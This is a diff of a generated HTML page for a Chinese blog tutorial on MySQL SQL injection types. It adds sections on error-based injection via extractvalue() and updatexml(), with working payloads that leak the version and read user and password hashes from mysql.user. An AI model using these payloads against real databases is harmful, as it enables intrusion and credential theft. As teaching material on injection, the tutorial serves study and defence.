@@ -23,7 +23,7 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
 基于时间的盲注
 
 mysql&amp;gt; select username from admin where id">
-<meta property="og:updated_time" content="2015-08-14T03:00:41.121Z">
+<meta property="og:updated_time" content="2015-08-14T05:16:49.274Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MySql练级攻略-5-5种注入类型">
 <meta name="twitter:description" content="基于布尔的盲注
@@ -267,7 +267,20 @@ mysql&gt; select username from admin where id = <span class="number">1</span> or
 mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
 
 <span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
-</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)<em>2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)</em>3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
+</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)x2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)x3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
+<h4>extractvalue注入</h4>
+
+<pre><code>mysql&gt; select user <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">"test"</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,@@<span class="property">version</span>));
+</code></pre><p>说明：extractvalue函数是用来获取xml中的数据extractvalue(pram1,pram2)在pram2的部分正常情况下应该填写路径，在这里我们构造了extractvalue(1, concat(0x7e,@@version))，系统报错显示了我们构造部分的内容。获取内容有长度限制,最长32位。</p>
+<h4>UpdateXML()注入</h4>
+
+<pre><code>mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT distinct concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>);
+
+mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,a,<span class="number">1</span>);//上述语句简化
+
+//a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
+//对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
+</code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.0x7e对应 ~.</p>
 <p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
 
       
